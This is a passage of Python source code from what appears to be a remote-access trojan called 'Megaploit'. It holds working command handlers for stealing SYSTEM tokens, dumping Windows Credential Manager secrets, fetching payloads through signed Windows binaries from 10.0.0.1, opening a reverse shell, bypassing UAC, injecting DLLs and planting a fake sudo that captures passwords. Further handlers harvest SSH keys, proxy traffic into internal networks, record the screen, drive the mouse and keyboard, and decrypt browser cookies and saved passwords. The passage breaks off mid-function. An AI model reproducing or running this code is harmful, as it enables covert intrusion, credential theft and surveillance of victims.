    if sys.platform != "win32":
        return "[-] token_steal is Windows-only"
    try:
        import ctypes
        import ctypes.wintypes as wt

        TOKEN_DUPLICATE        = 0x0002
        TOKEN_QUERY            = 0x0008
        TOKEN_IMPERSONATE      = 0x0004
        TOKEN_ALL_ACCESS       = 0xF01FF
        PROCESS_QUERY_INFO     = 0x0400
        SecurityImpersonation  = 2
        TokenImpersonation     = 2

        advapi32 = ctypes.windll.advapi32
        kernel32 = ctypes.windll.kernel32

        target_pid: int | None = None
        if args and args[0].isdigit():
            target_pid = int(args[0])
        else:
            # Find a SYSTEM process: winlogon.exe or lsass.exe
            import subprocess as _sp
            raw = _sp.check_output(
                ["tasklist", "/FI", "USERNAME eq SYSTEM", "/FO", "CSV", "/NH"],
                text=True, stderr=_sp.DEVNULL
            )
            for row in raw.splitlines():
                parts = row.strip().strip('"').split('","')
                if len(parts) >= 2 and parts[0].lower() in ("winlogon.exe", "lsass.exe", "services.exe"):
                    target_pid = int(parts[1])
                    break
            if target_pid is None:
                return "[-] Could not find a SYSTEM process automatically — supply a PID"

        # Enable SeDebugPrivilege
        h_token   = wt.HANDLE()
        h_process = kernel32.GetCurrentProcess()
        advapi32.OpenProcessToken(h_process, TOKEN_ALL_ACCESS, ctypes.byref(h_token))

        class LUID(ctypes.Structure):
            _fields_ = [("LowPart", wt.DWORD), ("HighPart", ctypes.c_long)]

        class LUID_AND_ATTRIBUTES(ctypes.Structure):
            _fields_ = [("Luid", LUID), ("Attributes", wt.DWORD)]

        class TOKEN_PRIVILEGES(ctypes.Structure):
            _fields_ = [("PrivilegeCount", wt.DWORD), ("Privileges", LUID_AND_ATTRIBUTES * 1)]

        SE_PRIVILEGE_ENABLED = 0x02
        luid = LUID()
        advapi32.LookupPrivilegeValueW(None, "SeDebugPrivilege", ctypes.byref(luid))
        tp = TOKEN_PRIVILEGES()
        tp.PrivilegeCount = 1
        tp.Privileges[0].Luid = luid
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
        advapi32.AdjustTokenPrivileges(h_token, False, ctypes.byref(tp),
                                       ctypes.sizeof(tp), None, None)
        kernel32.CloseHandle(h_token)

        # Open target process and duplicate its token
        h_target = kernel32.OpenProcess(PROCESS_QUERY_INFO, False, target_pid)
        if not h_target:
            return f"[-] OpenProcess({target_pid}) failed — need SeDebugPrivilege"

        h_proc_token  = wt.HANDLE()
        h_duped_token = wt.HANDLE()
        advapi32.OpenProcessToken(h_target, TOKEN_DUPLICATE | TOKEN_QUERY,
                                  ctypes.byref(h_proc_token))
        advapi32.DuplicateToken(h_proc_token, SecurityImpersonation,
                                ctypes.byref(h_duped_token))
        kernel32.CloseHandle(h_proc_token)
        kernel32.CloseHandle(h_target)

        # Impersonate
        result = advapi32.ImpersonateLoggedOnUser(h_duped_token)
        kernel32.CloseHandle(h_duped_token)

        if result:
            return f"[+] Token stolen from PID {target_pid} — now impersonating SYSTEM"
        return "[-] ImpersonateLoggedOnUser failed"
    except Exception as e:
        return f"[-] token_steal: {e}"


# ---------------------------------------------------------------------------
# Credential vault — Windows Credential Manager dump
# ---------------------------------------------------------------------------

@_register("cred_vault")
def _cred_vault(conn, args: list[str]) -> str:
    """
    Enumerate and dump credentials stored in the Windows Credential Manager
    (generic passwords, RDP saved credentials, etc.) using ctypes.
    No external tools required.
    """
    if sys.platform != "win32":
        return "[-] cred_vault is Windows-only (use wifi_passwords + hashdump on other platforms)"
    try:
        import ctypes
        import ctypes.wintypes as wt

        CRED_TYPE_GENERIC           = 1
        CRED_TYPE_DOMAIN_PASSWORD   = 2
        CRED_TYPE_DOMAIN_CERTIFICATE = 3
        CRED_ENUMERATE_ALL_CREDENTIALS = 0x1
        CRED_TYPES = {1: "Generic", 2: "Domain", 3: "Certificate", 4: "DomainVisible", 5: "Generic+Cert"}

        class CREDENTIAL_ATTRIBUTE(ctypes.Structure):
            _fields_ = [("Keyword", wt.LPWSTR), ("Flags", wt.DWORD),
                        ("ValueSize", wt.DWORD), ("Value", ctypes.POINTER(wt.BYTE))]

        class CREDENTIAL(ctypes.Structure):
            _fields_ = [
                ("Flags",              wt.DWORD),
                ("Type",               wt.DWORD),
                ("TargetName",         wt.LPWSTR),
                ("Comment",            wt.LPWSTR),
                ("LastWritten",        wt.FILETIME),
                ("CredentialBlobSize", wt.DWORD),
                ("CredentialBlob",     ctypes.POINTER(wt.BYTE)),
                ("Persist",            wt.DWORD),
                ("AttributeCount",     wt.DWORD),
                ("Attributes",         ctypes.POINTER(CREDENTIAL_ATTRIBUTE)),
                ("TargetAlias",        wt.LPWSTR),
                ("UserName",           wt.LPWSTR),
            ]

        advapi32 = ctypes.windll.advapi32
        count    = wt.DWORD(0)
        creds_ptr = ctypes.POINTER(ctypes.POINTER(CREDENTIAL))()

        if not advapi32.CredEnumerateW(None, CRED_ENUMERATE_ALL_CREDENTIALS,
                                        ctypes.byref(count), ctypes.byref(creds_ptr)):
            return "[-] CredEnumerateW failed — no credentials or insufficient rights"

        lines = [f"  Found {count.value} credential(s)\n"]
        for i in range(count.value):
            c = creds_ptr[i].contents
            kind   = CRED_TYPES.get(c.Type, str(c.Type))
            target = c.TargetName or "(none)"
            user   = c.UserName   or "(none)"
            secret = "(none)"
            if c.CredentialBlobSize and c.CredentialBlob:
                raw = bytes(c.CredentialBlob[j] for j in range(c.CredentialBlobSize))
                try:
                    secret = raw.decode("utf-16-le").rstrip("\x00")
                except Exception:
                    secret = raw.hex()
            lines.append(f"  [{kind}]")
            lines.append(f"    Target  : {target}")
            lines.append(f"    Username: {user}")
            lines.append(f"    Secret  : {secret}")
            lines.append("")

        advapi32.CredFree(creds_ptr)
        return "\n".join(lines)
    except Exception as e:
        return f"[-] cred_vault: {e}"


# ---------------------------------------------------------------------------
# Living-off-the-land — execute a signed Windows binary to run arbitrary code
# ---------------------------------------------------------------------------

@_register("living_off_land")
def _living_off_land(conn, args: list[str]) -> str:
    """
    Execute code via signed Windows LOLBins to blend in with normal activity.
    Usage: living_off_land <lolbin> <payload>
    Supported lolbins: mshta, regsvr32, certutil, wmic, rundll32, cscript
    Example: living_off_land mshta http://10.0.0.1/payload.hta
             living_off_land certutil -urlcache -f http://10.0.0.1/nc.exe nc.exe
    """
    if sys.platform != "win32":
        return "[-] living_off_land is Windows-only"
    if not args:
        return "Usage: living_off_land <lolbin> <args...>"

    lolbin = args[0].lower()
    rest   = " ".join(args[1:])

    LOLBINS = {
        "mshta":     "mshta.exe",
        "regsvr32":  "regsvr32.exe",
        "certutil":  "certutil.exe",
        "wmic":      "wmic.exe",
        "rundll32":  "rundll32.exe",
        "cscript":   "cscript.exe",
        "wscript":   "wscript.exe",
        "msiexec":   "msiexec.exe",
        "installutil": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe",
    }
    if lolbin not in LOLBINS:
        return f"[-] Unknown lolbin '{lolbin}'. Supported: {', '.join(LOLBINS)}"

    binary = LOLBINS[lolbin]
    full_cmd = f'"{binary}" {rest}'
    try:
        proc = subprocess.Popen(full_cmd, shell=True,
                                stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                stdin=subprocess.DEVNULL)
        try:
            out, err = proc.communicate(timeout=30)
            result = (out + err).decode(errors="replace").strip()
            return f"[+] {lolbin} launched (exit {proc.returncode})\n{result}" if result else \
                   f"[+] {lolbin} launched (exit {proc.returncode})"
        except subprocess.TimeoutExpired:
            # Detach — the process keeps running
            return f"[+] {lolbin} launched and detached (no stdout timeout)"
    except Exception as e:
        return f"[-] living_off_land: {e}"


# ---------------------------------------------------------------------------
# Reverse shell — connect back to operator with interactive PTY
# ---------------------------------------------------------------------------

@_register("reverse_shell")
def _reverse_shell(conn, args: list[str]) -> str:
    """
    Open a raw reverse TCP shell back to operator_host:port, separate from
    the C2 channel. Uses /bin/bash PTY on Unix, cmd.exe pipe on Windows.
    Usage: reverse_shell <operator_ip> <port>
    The connection runs in a background daemon thread.
    """
    if len(args) != 2:
        return "Usage: reverse_shell <operator_ip> <port>"
    try:
        host = args[0]
        port = int(args[1])
    except ValueError:
        return "[-] Invalid port"

    def _run():
        import socket as _sock
        try:
            s = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
            s.connect((host, port))
            if sys.platform == "win32":
                proc = subprocess.Popen(
                    ["cmd.exe"],
                    stdin=s.fileno(), stdout=s.fileno(), stderr=s.fileno(),
                    shell=False
                )
            else:
                import pty
                master, slave = pty.openpty()
                proc = subprocess.Popen(
                    ["/bin/bash", "-i"],
                    stdin=slave, stdout=slave, stderr=slave,
                    preexec_fn=os.setsid, close_fds=True
                )
                os.close(slave)

                def _relay_pty():
                    import select
                    while True:
                        r, _, _ = select.select([master, s.fileno()], [], [], 0.5)
                        if master in r:
                            try:
                                data = os.read(master, 4096)
                                s.sendall(data)
                            except OSError:
                                break
                        if s.fileno() in r:
                            try:
                                data = s.recv(4096)
                                if not data:
                                    break
                                os.write(master, data)
                            except OSError:
                                break

                threading.Thread(target=_relay_pty, daemon=True).start()
            proc.wait()
            s.close()
        except Exception:
            pass

    threading.Thread(target=_run, daemon=True).start()
    return f"[+] Reverse shell thread started → {host}:{port} (listen with: nc -lvnp {port})"


# ---------------------------------------------------------------------------
# UAC bypass — Windows auto-elevation via fodhelper.exe
# ---------------------------------------------------------------------------

@_register("uac_bypass")
def _uac_bypass(conn, args: list[str]) -> str:
    """
    Bypass UAC on Windows 10/11 using the fodhelper registry hijack.
    Writes a payload command into HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command
    and triggers it via fodhelper.exe — no prompts, no DLL drops.
    Usage: uac_bypass <command>
    Example: uac_bypass cmd.exe /c net localgroup administrators victim /add
    """
    if sys.platform != "win32":
        return "[-] uac_bypass is Windows-only"
    if not args:
        return "Usage: uac_bypass <command>"
    payload = " ".join(args)
    try:
        import winreg
        KEY = r"Software\Classes\ms-settings\shell\open\command"
        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, KEY) as k:
            winreg.SetValueEx(k, None,           0, winreg.REG_SZ, payload)
            winreg.SetValueEx(k, "DelegateExecute", 0, winreg.REG_SZ, "")

        subprocess.Popen(
            ["C:\\Windows\\System32\\fodhelper.exe"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        time.sleep(2)

        # Clean up the registry key
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, KEY,
                            access=winreg.KEY_SET_VALUE | winreg.KEY_READ) as k:
            try:
                winreg.DeleteValue(k, None)
                winreg.DeleteValue(k, "DelegateExecute")
            except FileNotFoundError:
                pass
        try:
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER,
                             r"Software\Classes\ms-settings\shell\open\command")
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER,
                             r"Software\Classes\ms-settings\shell\open")
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER,
                             r"Software\Classes\ms-settings\shell")
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER,
                             r"Software\Classes\ms-settings")
        except Exception:
            pass

        return f"[+] UAC bypass triggered via fodhelper → payload: {payload}"
    except Exception as e:
        return f"[-] uac_bypass: {e}"


# ---------------------------------------------------------------------------
# DLL injection — write a DLL to disk and inject via LoadLibrary remote thread
# ---------------------------------------------------------------------------

@_register("dll_inject")
def _dll_inject(conn, args: list[str]) -> str:
    """
    Inject a DLL (already on disk) into a running Windows process.
    Uses VirtualAllocEx + WriteProcessMemory + CreateRemoteThread(LoadLibraryA).
    Usage: dll_inject <pid> <path_to_dll_on_target>
    """
    if sys.platform != "win32":
        return "[-] dll_inject is Windows-only"
    if len(args) != 2 or not args[0].isdigit():
        return "Usage: dll_inject <pid> <dll_path>"
    pid      = int(args[0])
    dll_path = args[1]
    if not os.path.isfile(dll_path):
        return f"[-] DLL not found: {dll_path}"
    try:
        import ctypes

        PROCESS_ALL_ACCESS = 0x1F0FFF
        MEM_COMMIT         = 0x1000
        MEM_RESERVE        = 0x2000
        PAGE_READWRITE     = 0x04

        kernel32  = ctypes.windll.kernel32
        h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
        if not h_process:
            return f"[-] OpenProcess({pid}) failed"

        dll_bytes = dll_path.encode("ascii") + b"\x00"
        alloc = kernel32.VirtualAllocEx(
            h_process, None, len(dll_bytes),
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
        )
        if not alloc:
            kernel32.CloseHandle(h_process)
            return "[-] VirtualAllocEx failed"

        written = ctypes.c_size_t(0)
        kernel32.WriteProcessMemory(h_process, alloc, dll_bytes,
                                    len(dll_bytes), ctypes.byref(written))

        load_lib = kernel32.GetProcAddress(
            kernel32.GetModuleHandleW("kernel32.dll"), b"LoadLibraryA"
        )
        from ctypes import wintypes
        tid = wintypes.DWORD(0)
        h_thread = kernel32.CreateRemoteThread(
            h_process, None, 0, load_lib, alloc, 0, ctypes.byref(tid)
        )
        if not h_thread:
            kernel32.CloseHandle(h_process)
            return "[-] CreateRemoteThread failed"

        kernel32.WaitForSingleObject(h_thread, 5000)
        kernel32.CloseHandle(h_thread)
        kernel32.CloseHandle(h_process)
        return f"[+] DLL '{dll_path}' injected into PID {pid} via LoadLibraryA — TID {tid.value}"
    except Exception as e:
        return f"[-] dll_inject: {e}"


# ---------------------------------------------------------------------------
# sudo/su credential sniffing — intercept password via LD_PRELOAD fake sudo
# ---------------------------------------------------------------------------

@_register("sudo_sniff")
def _sudo_sniff(conn, args: list[str]) -> str:
    """
    Deploy a fake 'sudo' wrapper into a user-writable directory on PATH that
    captures the next sudo password, logs it, then passes execution through to
    the real sudo transparently.
    Unix only. Requires a writable directory earlier on PATH than /usr/bin.
    Usage: sudo_sniff [log_path]
    Default log_path: /tmp/.ssniff
    """
    if sys.platform == "win32":
        return "[-] sudo_sniff is Unix-only"

    log_path = args[0] if args else "/tmp/.ssniff"

    # Find first writable PATH dir that comes before real sudo
    real_sudo = shutil.which("sudo") or "/usr/bin/sudo"
    target_dir: str | None = None
    path_dirs = os.environ.get("PATH", "").split(":")
    for d in path_dirs:
        if not d:
            continue
        real_in_dir = os.path.join(d, "sudo")
        if real_in_dir == real_sudo:
            break   # don't shadow after real sudo
        if os.access(d, os.W_OK):
            target_dir = d
            break

    if not target_dir:
        return ("[-] No writable PATH directory before real sudo found.\n"
                f"    Real sudo: {real_sudo}\n"
                f"    PATH: {os.environ.get('PATH','')}")

    fake_sudo = os.path.join(target_dir, "sudo")
    wrapper = f"""#!/bin/sh
# Megaploit sudo_sniff wrapper
read -s -p "[sudo] password for $(whoami): " PW
echo
echo "$PW" >> {log_path}
{real_sudo} "$@"
"""
    try:
        with open(fake_sudo, "w") as f:
            f.write(wrapper)
        os.chmod(fake_sudo, 0o755)
        return (f"[+] Fake sudo installed at {fake_sudo}\n"
                f"    Passwords will be captured to {log_path}\n"
                f"    Retrieve with: download {log_path}")
    except Exception as e:
        return f"[-] sudo_sniff: {e}"


# ---------------------------------------------------------------------------
# SSH key + known_hosts harvest
# ---------------------------------------------------------------------------

@_register("ssh_harvest")
def _ssh_harvest(conn, args: list[str]) -> str:
    """
    Collect all SSH private keys, known_hosts, and authorized_keys files
    from the target's home directory (and /root if accessible).
    Returns a combined text dump.
    """
    home = os.path.expanduser("~")
    search_roots = [home]
    if home != "/root" and os.path.isdir("/root"):
        search_roots.append("/root")

    lines: list[str] = []
    interesting = {"id_rsa", "id_ed25519", "id_ecdsa", "id_dsa",
                   "known_hosts", "authorized_keys", "config"}

    for root in search_roots:
        ssh_dir = os.path.join(root, ".ssh")
        if not os.path.isdir(ssh_dir):
            continue
        lines.append(f"\n=== {ssh_dir} ===")
        for fname in sorted(os.listdir(ssh_dir)):
            fpath = os.path.join(ssh_dir, fname)
            if not os.path.isfile(fpath):
                continue
            try:
                with open(fpath, "r", errors="replace") as f:
                    content = f.read()
                lines.append(f"\n--- {fname} ---")
                lines.append(content[:8192])   # cap per file at 8 KB
                if len(content) > 8192:
                    lines.append(f"... ({len(content)} bytes total, truncated)")
            except PermissionError:
                lines.append(f"--- {fname}: permission denied ---")
            except OSError as e:
                lines.append(f"--- {fname}: {e} ---")

    # Also grab bash/zsh history for SSH commands
    for hist_file in (".bash_history", ".zsh_history", ".history"):
        hpath = os.path.join(home, hist_file)
        if os.path.isfile(hpath):
            try:
                with open(hpath, "r", errors="replace") as f:
                    content = f.read()
                ssh_lines = [l for l in content.splitlines() if "ssh" in l.lower()]
                if ssh_lines:
                    lines.append(f"\n=== {hist_file} (SSH commands) ===")
                    lines.append("\n".join(ssh_lines[-50:]))  # last 50
            except OSError:
                pass

    return "\n".join(lines) if lines else "[-] No SSH files found"


# ---------------------------------------------------------------------------
# Reverse SOCKS5 proxy — tunnel all operator traffic through the target
# ---------------------------------------------------------------------------

@_register("socks5")
def _socks5(conn, args: list[str]) -> str:
    """
    Start a SOCKS5 proxy server on the agent machine.
    The operator then configures their tools (proxychains, curl, etc.) to use
    agent_ip:port as a SOCKS5 proxy to reach the target's internal network.
    Usage: socks5 <port>   (default: 1080)
    """
    port = 1080
    if args and args[0].isdigit():
        port = int(args[0])

    import socket as _sock
    import struct

    def _handle(client: _sock.socket) -> None:
        """Minimal SOCKS5 implementation (no-auth)."""
        try:
            # Auth negotiation
            header = client.recv(2)
            if len(header) < 2:
                return
            n_methods = header[1]
            client.recv(n_methods)  # discard methods
            client.sendall(b"\x05\x00")  # no auth

            # Request
            req = client.recv(4)
            if len(req) < 4 or req[1] != 0x01:
                client.sendall(b"\x05\x07\x00\x01" + b"\x00" * 6)
                return
            atype = req[3]
            if atype == 0x01:    # IPv4
                host = _sock.inet_ntoa(client.recv(4))
            elif atype == 0x03:  # domain
                dlen = client.recv(1)[0]
                host = client.recv(dlen).decode()
            elif atype == 0x04:  # IPv6
                host = _sock.inet_ntop(_sock.AF_INET6, client.recv(16))
            else:
                client.sendall(b"\x05\x08\x00\x01" + b"\x00" * 6)
                return
            port_bytes = client.recv(2)
            dst_port   = struct.unpack("!H", port_bytes)[0]

            try:
                remote = _sock.create_connection((host, dst_port), timeout=10)
                bound  = remote.getsockname()
                reply  = (b"\x05\x00\x00\x01" +
                          _sock.inet_aton(bound[0]) +
                          struct.pack("!H", bound[1]))
                client.sendall(reply)
            except OSError as e:
                client.sendall(b"\x05\x05\x00\x01" + b"\x00" * 6)
                return

            # Relay
            def _relay(src, dst):
                try:
                    while True:
                        data = src.recv(4096)
                        if not data:
                            break
                        dst.sendall(data)
                except OSError:
                    pass
                finally:
                    for s in (src, dst):
                        try:
                            s.close()
                        except OSError:
                            pass

            threading.Thread(target=_relay, args=(client, remote), daemon=True).start()
            threading.Thread(target=_relay, args=(remote, client), daemon=True).start()

        except Exception:
            try:
                client.close()
            except OSError:
                pass

    def _accept(server: _sock.socket) -> None:
        while True:
            try:
                client, _ = server.accept()
                threading.Thread(target=_handle, args=(client,), daemon=True).start()
            except OSError:
                break

    try:
        srv = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
        srv.setsockopt(_sock.SOL_SOCKET, _sock.SO_REUSEADDR, 1)
        srv.bind(("0.0.0.0", port))
        srv.listen(32)
        threading.Thread(target=_accept, args=(srv,), daemon=True).start()
        return (f"[+] SOCKS5 proxy listening on 0.0.0.0:{port}\n"
                f"    Use:  proxychains4 -q <tool>  (set socks5 127.0.0.1 {port} in proxychains.conf)\n"
                f"    Or:   curl --socks5 <agent_ip>:{port} http://internal-host/")
    except OSError as e:
        return f"[-] socks5: {e}"


# ---------------------------------------------------------------------------
# Screen-record — capture a video of the desktop (MJPEG → AVI via opencv)
# ---------------------------------------------------------------------------

@_register("screenrecord")
def _screenrecord(conn, args: list[str]) -> str | None:
    """
    Record the target's screen for N seconds, save as AVI, send back.
    Usage: screenrecord <seconds>
    """
    if not args or not args[0].isdigit():
        return "Usage: screenrecord <seconds>"
    seconds = min(int(args[0]), 300)
    try:
        import cv2
        import mss
        import numpy

        fps = 10
        with mss.mss() as sct:
            monitor = sct.monitors[1]
            w, h    = monitor["width"], monitor["height"]

        out_path = "_screenrec.avi"
        fourcc   = cv2.VideoWriter_fourcc(*"XVID")
        writer   = cv2.VideoWriter(out_path, fourcc, fps, (w, h))

        start = time.time()
        with mss.mss() as sct:
            monitor = sct.monitors[1]
            while time.time() - start < seconds:
                raw = sct.grab(monitor)
                arr = numpy.array(raw)
                bgr = cv2.cvtColor(arr, cv2.COLOR_BGRA2BGR)
                writer.write(bgr)
                time.sleep(1 / fps)
        writer.release()

        _send_msg(conn, "FILE_OK")
        _send_file(conn, out_path)
        try:
            os.remove(out_path)
        except OSError:
            pass
        return None
    except ImportError as e:
        return f"[-] screenrecord requires opencv-python + mss: {e}"
    except Exception as e:
        return f"[-] screenrecord: {e}"


# ---------------------------------------------------------------------------
# Mouse control — silently move/click the mouse
# ---------------------------------------------------------------------------

@_register("mouse_move")
def _mouse_move(conn, args: list[str]) -> str:
    """
    Silently move the mouse to (x, y) and optionally click.
    Usage: mouse_move <x> <y> [click]
    Example: mouse_move 960 540 click
    """
    if len(args) < 2 or not args[0].isdigit() or not args[1].isdigit():
        return "Usage: mouse_move <x> <y> [click]"
    if not _HAS_GUI:
        return "[-] pyautogui not available"
    x, y = int(args[0]), int(args[1])
    do_click = len(args) >= 3 and args[2].lower() == "click"
    try:
        pyautogui.moveTo(x, y, duration=0.1)
        if do_click:
            pyautogui.click(x, y)
            return f"[+] Mouse moved to ({x},{y}) and clicked"
        return f"[+] Mouse moved to ({x},{y})"
    except Exception as e:
        return f"[-] mouse_move: {e}"


# ---------------------------------------------------------------------------
# Keyboard injection — silently type text or press hotkeys
# ---------------------------------------------------------------------------

@_register("type_keys")
def _type_keys(conn, args: list[str]) -> str:
    """
    Silently type a string into whatever window currently has focus, or
    press a key combination.
    Usage: type_keys text <string to type>
           type_keys hotkey <key1> [key2] [key3]
    Examples:
      type_keys text hello world
      type_keys hotkey ctrl c
      type_keys hotkey win r
    """
    if not _HAS_GUI:
        return "[-] pyautogui not available"
    if len(args) < 2:
        return "Usage: type_keys text <string>  OR  type_keys hotkey <key> [key2] [key3]"
    mode = args[0].lower()
    try:
        if mode == "text":
            text = " ".join(args[1:])
            pyautogui.typewrite(text, interval=0.02)
            return f"[+] Typed: {text[:50]}{'...' if len(text) > 50 else ''}"
        elif mode == "hotkey":
            keys = args[1:]
            pyautogui.hotkey(*keys)
            return f"[+] Hotkey: {'+'.join(keys)}"
        else:
            return "Usage: type_keys text <string>  OR  type_keys hotkey <key> [key2] [key3]"
    except Exception as e:
        return f"[-] type_keys: {e}"


# ---------------------------------------------------------------------------
# Browser cookie + saved-password hijacker
# ---------------------------------------------------------------------------
#
# How Chromium (Chrome / Edge / Brave / Opera) stores secrets
# -----------------------------------------------------------
# The encryption key is a 32-byte AES key encrypted with the OS DPAPI and then
# base64-encoded under the "os_crypt.encrypted_key" field of the "Local State"
# JSON file that lives in the *parent* of the "Default" profile directory.
# The AES key header is b"DPAPI", so we strip those 5 bytes before decrypting.
# Each credential / cookie value is then AES-256-GCM encrypted:
#   [b"v10"][12-byte nonce][ciphertext][16-byte tag]
#
# How Firefox stores secrets
# --------------------------
# Cookies:   cookies.sqlite  (host / name / value plaintext in most configs)
# Passwords: logins.json holds base64-encoded ciphertext fields; key4.db holds
#            the NSS-wrapped master key.  Full NSS decryption requires ctypes
#            bindings to libnss3.  We pull the raw logins.json so the operator
#            can decrypt offline, and we include a helper that calls the
#            nss3 library if present.

@_register("browser_creds")
def _browser_creds(conn, args: list[str]) -> str:
    """
    Steal all browser cookies and saved login credentials from:
      Chrome, Edge, Brave, Opera  (Chromium family — Windows/macOS/Linux)
      Firefox                     (all platforms)

    On Windows the Chromium DPAPI key is decrypted in-process via ctypes so
    every password and session cookie is returned in plaintext — no external
    tools needed.

    On Linux the key may be protected by libsecret / kwallet; we fall back to
    returning the raw ciphertext with a note.

    Usage: browser_creds [cookies|passwords|all]
    Default: all
    """
    mode = args[0].lower() if args else "all"
    if mode not in ("cookies", "passwords", "all"):
        return "Usage: browser_creds [cookies|passwords|all]"

    home    = os.path.expanduser("~")
    output: list[str] = []

    # ------------------------------------------------------------------
    # Helper: locate every Chromium-family profile directory
    # ------------------------------------------------------------------
    def _chromium_profiles() -> list[tuple[str, str]]:
        """Return list of (browser_name, Default_profile_dir)."""
        candidates = []
        if sys.platform == "win32":
            local = os.environ.get("LOCALAPPDATA", "")
            roaming = os.environ.get("APPDATA", "")
            roots = [
                ("Chrome",  os.path.join(local,   "Google",    "Chrome",  "User Data")),
                ("Edge",    os.path.join(local,   "Microsoft", "Edge",    "User Data")),
                ("Brave",   os.path.join(local,   "BraveSoftware", "Brave-Browser", "User Data")),
                ("Opera",   os.path.join(roaming, "Opera Software", "Opera Stable")),
                ("Chromium",os.path.join(local,   "Chromium", "User Data")),
            ]
        elif sys.platform == "darwin":
            lib = os.path.join(home, "Library", "Application Support")
            roots = [
                ("Chrome",  os.path.join(lib, "Google",    "Chrome")),
                ("Edge",    os.path.join(lib, "Microsoft", "Edge")),
                ("Brave",   os.path.join(lib, "BraveSoftware", "Brave-Browser")),
                ("Opera",   os.path.join(lib, "com.operasoftware.Opera")),
                ("Chromium",os.path.join(lib, "Chromium")),
            ]
        else:
            cfg = os.path.join(home, ".config")
            roots = [
                ("Chrome",  os.path.join(cfg, "google-chrome")),
                ("Edge",    os.path.join(cfg, "microsoft-edge")),
                ("Brave",   os.path.join(cfg, "BraveSoftware", "Brave-Browser")),
                ("Opera",   os.path.join(cfg, "opera")),
                ("Chromium",os.path.join(cfg, "chromium")),
            ]

        result = []
        for name, user_data in roots:
            # "User Data/Default" pattern (Windows/Linux) or direct profile
            for sub in ("Default", "Profile 1", "Profile 2", ""):
                candidate = os.path.join(user_data, sub) if sub else user_data
                if os.path.isdir(candidate):
                    result.append((name, candidate))
                    break
        return result

    # ------------------------------------------------------------------
    # Helper: decrypt the Chromium AES-256-GCM master key (Windows only)
    # ------------------------------------------------------------------
    def _get_chromium_key_windows(user_data_dir: str) -> bytes | None:
        """Read Local State → base64-decode → DPAPI-decrypt → return raw AES key."""
        local_state = os.path.join(user_data_dir, "Local State")
        if not os.path.isfile(local_state):
            return None
        try:
            import json as _json
            with open(local_state, encoding="utf-8") as f:
                ls = _json.load(f)
            b64_key = ls["os_crypt"]["encrypted_key"]
            import base64
            encrypted_key = base64.b64decode(b64_key)
            # Strip the "DPAPI" prefix (5 bytes)
            if not encrypted_key.startswith(b"DPAPI"):
                return None
            encrypted_key = encrypted_key[5:]
            import ctypes
            import ctypes.wintypes as wt
            # CryptUnprotectData
            class DATA_BLOB(ctypes.Structure):
                _fields_ = [("cbData", wt.DWORD), ("pbData", ctypes.POINTER(ctypes.c_char))]
            input_blob = DATA_BLOB(len(encrypted_key),
                                   ctypes.cast(ctypes.c_char_p(encrypted_key),
                                               ctypes.POINTER(ctypes.c_char)))
            output_blob = DATA_BLOB()
            if ctypes.windll.crypt32.CryptUnprotectData(
                ctypes.byref(input_blob), None, None, None, None, 0,
                ctypes.byref(output_blob)
            ):
                raw = bytes(output_blob.pbData[i] for i in range(output_blob.cbData))
                ctypes.windll.kernel32.LocalFree(output_blob.pbData)
                return raw
        except Exception:
            pass
        return None

    def _get_chromium_key_linux(user_data_dir: str) -> bytes | None:
        """
        On Linux Chromium protects the key with 'peanuts' (v10) or libsecret/kwallet.
        The hardcoded fallback key for non-keyring setups is b'peanuts' padded to 16 bytes
        with PBKDF2HMAC(sha1, salt=b'saltysalt', iterations=1).
        """
        try:
            from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
            from cryptography.hazmat.primitives import hashes
            kdf = PBKDF2HMAC(algorithm=hashes.SHA1(), length=16,
                             salt=b"saltysalt", iterations=1)
            return kdf.derive(b"peanuts")
        except ImportError:
            return None

    def _get_chromium_key_mac(user_data_dir: str) -> bytes | None:
        """macOS: key is in the Keychain under 'Chrome Safe Storage' etc."""
        try:
            from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
            from cryptography.hazmat.primitives import hashes
            # Try to get the keychain password
            keychain_password = b"peanuts"  # fallback
            try:
                raw = subprocess.check_output(
                    ["security", "find-generic-password", "-wa", "Chrome"],
                    stderr=subprocess.DEVNULL
                ).strip()
                if raw:
                    keychain_password = raw
            except Exception:
                pass
            kdf = PBKDF2HMAC(algorithm=hashes.SHA1(), length=16,
                             salt=b"saltysalt", iterations=1003)
            return kdf.derive(keychain_password)
        except ImportError:
            return None

    def _get_chromium_key(browser: str, profile_dir: str) -> bytes | None:
        user_data_dir = os.path.dirname(profile_dir)
        if sys.platform == "win32":
            return _get_chromium_key_windows(user_data_dir)
        elif sys.platform == "darwin":
            return _get_chromium_key_mac(user_data_dir)
        else:
            return _get_chromium_key_linux(user_data_dir)

    # ------------------------------------------------------------------
    # Helper: AES-256-GCM decrypt a Chromium v10/v20 value
    # ------------------------------------------------------------------
    def _chromium_decrypt(encrypted_value: bytes, key: bytes | None) -> str:
        """Decrypt a Chromium-encrypted blob. Returns plaintext or hex on failure."""
        if not encrypted_value:
            return ""
        # v10/v20 prefix = AES-GCM with 12-byte nonce
        if encrypted_value[:3] in (b"v10", b"v20"):
            if key is None:
                return f"<encrypted-v10: {encrypted_value.hex()[:64]}>"
            try:
                from cryptography.hazmat.primitives.ciphers.aead import AESGCM
                nonce      = encrypted_value[3:15]
                ciphertext = encrypted_value[15:]
                return AESGCM(key).decrypt(nonce, ciphertext, None).decode("utf-8", errors="replace")
            except Exception as e:
                return f"<decrypt-error: {e}>"
        # Older plaintext or unknown format
        try:
            return encrypted_value.decode("utf-8", errors="replace")
        except Exception:
            return encrypted_value.hex()

    # ------------------------------------------------------------------
    # Chromium: saved passwords  (Login Data DB)
    # ------------------------------------------------------------------
